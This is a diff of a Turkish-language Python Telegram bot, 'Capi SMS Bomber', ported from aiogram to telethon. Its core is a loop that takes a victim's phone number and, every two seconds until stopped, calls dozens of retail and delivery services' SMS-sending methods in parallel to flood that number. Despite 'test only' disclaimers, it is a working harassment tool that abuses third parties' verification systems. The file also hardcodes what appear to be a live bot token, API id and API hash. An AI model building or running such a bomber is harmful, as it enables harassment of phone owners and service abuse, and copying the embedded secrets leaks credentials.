@@ -1,137 +1,109 @@
-import asyncio
-import logging
+from telethon import TelegramClient, events
 from sms import SendSms
-from aiogram import Bot, Dispatcher, types
-from aiogram.types import Message
-from aiogram.utils import executor
-from concurrent.futures import ThreadPoolExecutor, wait
-from os import getenv
+import asyncio
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
+import logging
 
-API_TOKEN = '7107604320:AAEcx_S-aa8IwW8PiOWcAdNm_dAX0EczFX4'
+# Telegram API bilgileri
+api_id = 23350184
+api_hash = "41f0c2a157268e158f91ab7d59f4fc19"
+bot_token = "7107604320:AAEcx_S-aa8IwW8PiOWcAdNm_dAX0EczFX4"
 
-bot = Bot(token=API_TOKEN)
-dp = Dispatcher(bot)
-executor_thread = ThreadPoolExecutor(max_workers=50)
+# Log ayarları
+logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s - %(message)s')
+
+client = TelegramClient('smsbomber_bot', api_id, api_hash).start(bot_token=bot_token)
 
 active_tasks = {}
 status_counts = {}
+executor = ThreadPoolExecutor(max_workers=50)
 
-@dp.message_handler(commands=["start"])
-async def start_handler(message: Message):
-    await message.answer(
-        "🚀 <b>Capi SMS Bomber</b>'a hoş geldin!\n\n"
-        "Bu bot, verilen telefon numarasına çok sayıda SMS gönderimi simüle eder.\n"
-        "⚠️ <b>Bu bir eğitim/deneme projesidir.</b>\n\n"
-        "<b>Kullanabileceğin komutlar:</b>\n"
-        "📲 /sms <telefon> - SMS bombardımanını başlat\n"
-        "⛔ /stop - Gönderimi durdur\n"
-        "ℹ️ /help - Yardım menüsünü göster\n\n"
-        "🔐 Güvenliğin için yalnızca kendi numaralarını dene.\n"
-        "Botu kullanırken lütfen etik kurallara dikkat et!"
-        , parse_mode="HTML"
+@client.on(events.NewMessage(pattern='/start'))
+async def start_handler(event):
+    await event.respond(
+        "**Capi SMS Bomber'a Hoş Geldin!**\n\n"
+        "Bu bot belirli servisler üzerinden SMS gönderimi simüle eder.\n\n"
+        "**Komutlar:**\n"
+        "📲 `/sms <telefon>` - SMS göndermeye başla\n"
+        "⛔ `/stop` - Gönderimi durdur\n"
+        "ℹ️ `/help` - Yardım\n"
+        "🔧 `/servisler` - Mevcut servis sayısını göster\n\n"
+        "⚠️ *Bu proje sadece test amaçlıdır.*\n"
+        "`Etik kurallar` çerçevesinde kullanınız.",
+        parse_mode='markdown'
     )
 
-@dp.message_handler(commands=["help"])
-async def help_handler(message: Message):
-    await message.answer("/sms <numara> - SMS göndermeye başla\n/stop - Göndermeyi durdur\n/help - Yardım")
+@client.on(events.NewMessage(pattern='/help'))
+async def help_handler(event):
+    await event.respond(
+        "**Yardım Menüsü**\n\n"
+        "`/sms <telefon>` - SMS göndermeye başlar\n"
+        "`/stop` - Aktif bombardımanı durdurur\n"
+        "`/servisler` - Servis sayısını listeler\n"
+        "`/start` - Bilgi mesajını tekrar gösterir"
+    )
 
-@dp.message_handler(lambda message: message.text.startswith("/sms "))
-async def sms_handler(message: Message):
-    args = message.text.split()
-    if len(args) != 2 or not args[1].isdigit() or len(args[1]) != 10:
-        await message.reply("Lütfen geçerli bir telefon numarası girin (10 haneli).")
-        return
+@client.on(events.NewMessage(pattern='/servisler'))
+async def service_count_handler(event):
+    dummy_sms = SendSms("0000000000", "")
+    service_count = len([
+        func for func in dir(SendSms)
+        if callable(getattr(dummy_sms, func)) and not func.startswith("__")
+    ])
+    await event.respond(f"Mevcut servis sayısı: **{service_count} adet**", parse_mode='markdown')
 
-    user_id = message.chat.id
-    tel_no = args[1]
+@client.on(events.NewMessage(pattern=r'/sms (\d{10})'))
+async def sms_handler(event):
+    user_id = event.chat_id
+    phone = event.pattern_match.group(1)
     status_counts[user_id] = {"basarili": 0, "basarisiz": 0}
 
-    status_message = await message.reply("SMS gönderimi başlatılıyor...")
+    await event.respond(f"SMS gönderimi başlatılıyor: `0{phone}`", parse_mode='markdown')
 
-    async def spam_sms():
-        send_sms = SendSms(tel_no)
+    send_sms = SendSms(phone, "")
+    services = [
+        getattr(send_sms, method) for method in dir(SendSms)
+        if callable(getattr(send_sms, method)) and not method.startswith("__")
+    ]
+
+    logging.info(f"{user_id} kullanıcısı için {len(services)} servis ile SMS gönderimi başlatıldı.")
+
+    async def spam():
         try:
             while user_id in active_tasks:
                 loop = asyncio.get_event_loop()
-                futures = [
-                    loop.run_in_executor(executor_thread, send_sms.Akasya),
-                    loop.run_in_executor(executor_thread, send_sms.Akbati),
-                    loop.run_in_executor(executor_thread, send_sms.Ayyildiz),
-                    loop.run_in_executor(executor_thread, send_sms.Baydoner),
-                    loop.run_in_executor(executor_thread, send_sms.Beefull),
-                    loop.run_in_executor(executor_thread, send_sms.Bim),
-                    loop.run_in_executor(executor_thread, send_sms.Bisu),
-                    loop.run_in_executor(executor_thread, send_sms.Bodrum),
-                    loop.run_in_executor(executor_thread, send_sms.Clickme),
-                    loop.run_in_executor(executor_thread, send_sms.Dominos),
-                    loop.run_in_executor(executor_thread, send_sms.Englishhome),
-                    loop.run_in_executor(executor_thread, send_sms.Evidea),
-                    loop.run_in_executor(executor_thread, send_sms.File),
-                    loop.run_in_executor(executor_thread, send_sms.Frink),
-                    loop.run_in_executor(executor_thread, send_sms.Happy),
-                    loop.run_in_executor(executor_thread, send_sms.Hayatsu),
-                    loop.run_in_executor(executor_thread, send_sms.Hey),
-                    loop.run_in_executor(executor_thread, send_sms.Hizliecza),
-                    loop.run_in_executor(executor_thread, send_sms.Icq),
-                    loop.run_in_executor(executor_thread, send_sms.Ipragaz),
-                    loop.run_in_executor(executor_thread, send_sms.Istegelsin),
-                    loop.run_in_executor(executor_thread, send_sms.Joker),
-                    loop.run_in_executor(executor_thread, send_sms.KahveDunyasi),
-                    loop.run_in_executor(executor_thread, send_sms.KimGb),
-                    loop.run_in_executor(executor_thread, send_sms.Komagene),
-                    loop.run_in_executor(executor_thread, send_sms.Koton),
-                    loop.run_in_executor(executor_thread, send_sms.KuryemGelsin),
-                    loop.run_in_executor(executor_thread, send_sms.Macro),
-                    loop.run_in_executor(executor_thread, send_sms.Metro),
-                    loop.run_in_executor(executor_thread, send_sms.Migros),
-                    loop.run_in_executor(executor_thread, send_sms.Naosstars),
-                    loop.run_in_executor(executor_thread, send_sms.Paybol),
-                    loop.run_in_executor(executor_thread, send_sms.Pidem),
-                    loop.run_in_executor(executor_thread, send_sms.Porty),
-                    loop.run_in_executor(executor_thread, send_sms.Qumpara),
-                    loop.run_in_executor(executor_thread, send_sms.Starbucks),
-                    loop.run_in_executor(executor_thread, send_sms.Suiste),
-                    loop.run_in_executor(executor_thread, send_sms.Taksim),
-                    loop.run_in_executor(executor_thread, send_sms.Tasdelen),
-                    loop.run_in_executor(executor_thread, send_sms.Tasimacim),
-                    loop.run_in_executor(executor_thread, send_sms.Tazi),
-                    loop.run_in_executor(executor_thread, send_sms.TiklaGelsin),
-                    loop.run_in_executor(executor_thread, send_sms.ToptanTeslim),
-                    loop.run_in_executor(executor_thread, send_sms.Ucdortbes),
-                    loop.run_in_executor(executor_thread, send_sms.Uysal),
-                    loop.run_in_executor(executor_thread, send_sms.Wmf),
-                    loop.run_in_executor(executor_thread, send_sms.Yapp),
-                    loop.run_in_executor(executor_thread, send_sms.YilmazTicaret),
-                    loop.run_in_executor(executor_thread, send_sms.Yuffi)
-                ]
+                futures = [loop.run_in_executor(executor, service) for service in services]
                 results = await asyncio.gather(*futures, return_exceptions=True)
+
                 for result in results:
                     if isinstance(result, Exception):
                         status_counts[user_id]["basarisiz"] += 1
                     else:
                         status_counts[user_id]["basarili"] += 1
-                await status_message.edit_text(
-                    f"_____________________________\n"
-                    f"| başarılı [{status_counts[user_id]['basarili']:^5}]       |\n"
-                    f"| başarısız [{status_counts[user_id]['basarisiz']:^5}]     |\n"
-                    f"|____________________________|"
+
+                log_message = (
+                    f"[{datetime.now().strftime('%H:%M:%S')}] "
+                    f"0{phone} | Başarılı: {status_counts[user_id]['basarili']} | "
+                    f"Başarısız: {status_counts[user_id]['basarisiz']}"
                 )
+                print(log_message)
                 await asyncio.sleep(2)
         except asyncio.CancelledError:
-            pass
+            logging.info(f"{user_id} kullanıcısı SMS gönderimini durdurdu.")
 
-    active_tasks[user_id] = asyncio.create_task(spam_sms())
+    task = asyncio.create_task(spam())
+    active_tasks[user_id] = task
 
-@dp.message_handler(commands=["stop"])
-async def stop_handler(message: Message):
-    user_id = message.chat.id
+@client.on(events.NewMessage(pattern='/stop'))
+async def stop_handler(event):
+    user_id = event.chat_id
     task = active_tasks.pop(user_id, None)
     if task:
         task.cancel()
-        await message.reply("SMS gönderimi durduruldu.")
+        await event.respond("SMS gönderimi durduruldu.")
+        logging.info(f"{user_id} için SMS gönderimi durduruldu.")
     else:
-        await message.reply("Zaten çalışmıyor.")
+        await event.respond("Zaten aktif bir işlem bulunmuyor.")
 
-if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO)
-    executor.start_polling(dp, skip_updates=True)
+client.run_until_disconnected()
